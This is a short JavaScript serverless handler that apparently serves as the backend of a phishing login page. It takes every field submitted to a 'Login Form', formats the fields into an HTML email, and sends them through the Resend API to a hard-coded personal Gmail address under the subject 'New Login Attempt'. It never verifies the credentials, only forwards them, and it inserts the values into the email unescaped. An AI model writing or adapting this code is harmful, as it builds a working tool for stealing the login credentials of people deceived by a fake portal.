import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const formData = req.body;
  const formType = formData.Form_Type || 'Login Form';

  // Build key-value list dynamically for email body
  let detailsHtml = '';
  for (const [key, value] of Object.entries(formData)) {
    if (key !== 'Form_Type') {
      detailsHtml += `<p><strong>${key.replace(/_/g, ' ')}:</strong> ${value}</p>`;
    }
  }

  try {
    const data = await resend.emails.send({
      from: 'Login Portal <onboarding@resend.dev>',
      to: ['nbroseten@gmail.com'],
      subject: `New Login Attempt - ${formType}`,
      html: `
        <h2>New Login Details Submitted</h2>
        <p><strong>Type:</strong> ${formType}</p>
        <hr />
        ${detailsHtml}
      `,
    });

    return res.status(200).json({ success: true, data });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}
